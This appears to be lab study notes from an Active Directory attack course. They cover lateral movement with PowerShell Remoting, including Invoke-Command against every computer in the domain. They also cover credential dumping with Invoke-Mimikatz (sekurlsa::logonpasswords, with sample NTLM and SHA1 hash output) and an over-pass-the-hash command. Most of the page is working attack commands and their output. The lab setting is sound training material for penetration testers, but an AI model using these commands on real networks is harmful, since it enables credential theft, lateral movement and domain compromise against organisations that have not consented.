# Lateral Movement

## PowerShell Remoting

There are two modes that we can use which is One-to-One and One-to-Many

### One-to-One

Interactive and runs in a process (wsmprovhost) and is stateful if opened as a session.  The following commands are used:

- `New-PSSession` - This is for persistent sessions and should be passed in as a variable e.g. `$sess = New-PSSession -ComputerName xxx`
- `Enter-PSSession` - Single Interactive Session

```powershell
PS C:\AD\Tools> Enter-PSSession -ComputerName dcorp-adminsrv
[dcorp-adminsrv]: PS C:\Users\student141\Documents> hostname; ipconfig
dcorp-adminsrv

Windows IP Configuration

Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::61f0:8cf2:7b05:4f42%2
   IPv4 Address. . . . . . . . . . . : 172.16.4.101
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254

Tunnel adapter isatap.{5A335808-BE49-450F-AFA2-F08ED9EF5EEF}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :
[dcorp-adminsrv]: PS C:\Users\student141\Documents>
```

### Many-to-Many

This is also known as Fan-Out remoting and is non interactive, but provides the ability to execute commands in parallel and is called by the command `Invoke-Command`

```powershell
PS C:\AD\Tools> Invoke-Command -ScriptBlock {Get-Process} -ComputerName dcorp-adminsrv

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                             PSComputerName
-------  ------    -----      -----     ------     --  -- -----------                             --------------
     39       4     1540       2592       0.02   1224   2 cmd                                     dcorp-adminsrv
    111       9     1664       7808       0.13    984   1 conhost                                 dcorp-adminsrv
    109       9     5336      11384       0.02   2808   2 conhost                                 dcorp-adminsrv
    226      11     1860       4120       0.41    396   0 csrss                                   dcorp-adminsrv
    124       9     1312       6796       0.13    488   1 csrss                                   dcorp-adminsrv
<snip...>
```

We can also use `Get-Content` to pass in a list of servers

```powershell
PS C:\AD\Tools> Invoke-Command -ScriptBlock {hostname; whoami} -ComputerName (Get-Content .\computer-names.txt)
dcorp-adminsrv
dcorp\student141
dcorp-std141
dcorp\student141
```

It is also possible to pass in all Computers on Domain

```powershell
PS C:\AD\Tools> Invoke-Command -ScriptBlock {hostname; whoami} -ComputerName (Get-NetComputer) -ErrorAction SilentlyContinue
dcorp-adminsrv
dcorp\student141
dcorp-std141
dcorp\student141
```

Aside from `-ScriptBlock` it is also possible to execute scripts from files using the `-FilePath` parameter

To execute locally loaded functions on remote machines

```powershell
PS C:\AD\Tools> Invoke-Command -ScriptBlock ${function:Invoke-AllChecks} -ComputerName dcorp-adminsrv

[*] Running Invoke-AllChecks
Cannot invoke method. Method invocation is supported only on core types in this language mode.
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
    + PSComputerName        : dcorp-adminsrv
```

Note that this didn't execute due to a Constrained Language Setting on the machine which prohibits the running of this command in this circumstance

## Mimikatz

Mimikatz is used to dump credentials, tickets, passing and replaying hashes, tickets for many types of Active Directory attacks

```powershell
PS C:\AD\Tools> invoke-mimikatz -DumpCreds

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 19131547 (00000000:0123ec9b)
Session           : RemoteInteractive from 4
User Name         : student141
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/27/2020 11:38:08 PM
SID               : S-1-5-21-1874506631-3219952063-538504511-45111
        msv :
         [00000003] Primary
         * Username : student141
         * Domain   : dcorp
         * NTLM     : 324a5b98f2be9ef7440c199b4e51f9e2
         * SHA1     : 8912baf570d2ac2e4b2f6e27a4f7f85bc88a28ef
         * DPAPI    : 341d4ff6422d745a82b7258ce43a55f3
        tspkg :
        wdigest :
         * Username : student141
         * Domain   : dcorp
         * Password : (null)
        kerberos :
         * Username : student141
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)
        ssp :
        credman :
<snip...>
```

You can also use it to dump credentials on multiple machines `invoke-mimikatz -DumpCreds -ComputerName @("dcorp-adminsrv","computer2")` which will then use the `Invoke-Command` 

### Over Pass the Hash

To generate a token from a Hash you use the command `Invoke-Mimikatz -Command '"sekurlsa::pth /user:**Administrator** /domain:**dollarcorp.moneycorp.local** /ntlm:**<ntlmhash>** /run:powershell.exe"'`